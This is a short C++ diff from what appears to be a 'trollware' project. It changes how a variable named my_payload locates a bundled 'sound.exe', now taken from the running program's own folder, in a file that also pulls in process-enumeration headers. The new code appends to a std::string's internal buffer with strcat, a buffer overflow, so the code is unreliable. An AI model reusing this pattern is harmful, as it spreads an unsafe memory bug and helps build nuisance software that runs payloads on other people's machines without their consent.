@@ -6,6 +6,7 @@
 #include <vector>
 #include <tlhelp32.h>
 #include <iostream>
+#include <filesystem>
 
 
 
@@ -63,7 +64,11 @@ std::vector<unsigned char> ReadBinaryFile(const std::string& filepath) {
 
 // std::vector<unsigned char>  ExecutableBytes = ReadBinaryFile("D:\\CLASSSWORKKK\\far5a\\Far5a-Trollware\\bin\\sound.exe");
 
-unsigned char  my_payload []= "D:\\CLASSSWORKKK\\far5a\\Far5a-Trollware\\bin\\sound.exe";
+char exepath [255] = {0};
+int dummy = GetModuleFileNameA(NULL, exepath, 255);
+std::string DirectoryPath = std::filesystem::path(exepath).parent_path().string();
+
+unsigned char* my_payload = (unsigned char*)&strcat(DirectoryPath.data(), "\\sound.exe")[0];
 
 // unsigned char * my_payload = ExecutableBytes.data();
 
